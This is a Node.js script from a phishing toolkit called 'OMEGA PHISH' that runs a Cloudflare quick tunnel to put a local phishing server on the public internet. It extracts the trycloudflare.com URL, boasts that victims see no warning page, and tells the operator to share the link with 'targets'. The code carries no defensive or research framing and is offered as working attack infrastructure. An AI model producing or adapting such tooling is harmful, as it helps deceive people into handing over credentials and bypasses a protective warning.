// Cloudflare Tunnel - Get Public URL (No Warning Page!)
// Run this AFTER starting the phishing server

const { spawn } = require('child_process');
const path = require('path');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log('='.repeat(60));
console.log('OMEGA PHISH - CLOUDFLARE TUNNEL');
console.log('='.repeat(60));
console.log('');

rl.question('Enter the port number (default: 8080): ', (answer) => {
    const port = answer.trim() || '8080';

    console.log('');
    console.log(`Starting Cloudflare Tunnel for port ${port}...`);
    console.log('Please wait (this takes 5-10 seconds)...');
    console.log('');

    const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');
    const tunnel = spawn(cloudflaredPath, ['tunnel', '--url', `http://localhost:${port}`]);

    let urlFound = false;

    tunnel.stdout.on('data', (data) => {
        const output = data.toString();

        // Look for the public URL in the output
        const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
        if (urlMatch && !urlFound) {
            urlFound = true;
            console.log('✅ SUCCESS!');
            console.log('');
            console.log('='.repeat(60));
            console.log('PUBLIC URL:', urlMatch[0]);
            console.log('='.repeat(60));
            console.log('');
            console.log('✨ NO WARNING PAGE - Direct access!');
            console.log('Copy this URL and share it with your targets!');
            console.log('');
            console.log('Press Ctrl+C to stop the tunnel.');
            console.log('');
        }
    });

    tunnel.stderr.on('data', (data) => {
        // Cloudflare outputs to stderr, check there too
        const output = data.toString();
        const urlMatch = output.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
        if (urlMatch && !urlFound) {
            urlFound = true;
            console.log('✅ SUCCESS!');
            console.log('');
            console.log('='.repeat(60));
            console.log('PUBLIC URL:', urlMatch[0]);
            console.log('='.repeat(60));
            console.log('');
            console.log('✨ NO WARNING PAGE - Direct access!');
            console.log('Copy this URL and share it with your targets!');
            console.log('');
            console.log('Press Ctrl+C to stop the tunnel.');
            console.log('');
        }
    });

    tunnel.on('close', (code) => {
        console.log('Tunnel closed.');
        process.exit(code);
    });

    // Handle Ctrl+C
    process.on('SIGINT', () => {
        tunnel.kill();
        process.exit(0);
    });

    rl.close();
});
